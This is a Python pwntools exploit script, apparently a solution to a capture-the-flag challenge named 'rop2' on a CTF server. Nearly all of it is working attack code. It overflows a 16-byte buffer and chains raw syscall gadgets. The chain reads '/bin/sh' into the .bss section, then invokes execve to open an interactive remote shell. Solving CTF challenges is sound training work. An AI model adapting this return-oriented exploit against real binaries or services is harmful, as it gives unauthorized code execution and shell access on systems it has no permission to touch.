from pwn import *
import pwn


def main():
    r = pwn.remote('ctf.hackme.quest', 7703)
    elf = pwn.ELF('./asset/rop2')
    bss_addr = elf.bss()
    system_call_addr = 0x08048320
    overflow_addr = 0x08048454

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0x3) + p32(0x0) + p32(bss_addr) + p32(0x8)
    r.send(p)
    r.send(b'/bin/sh\x00')

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0xb) + p32(bss_addr) + p32(0x0) + p32(0x0)
    r.send(p)
    r.interactive()


if __name__ == '__main__':
    main()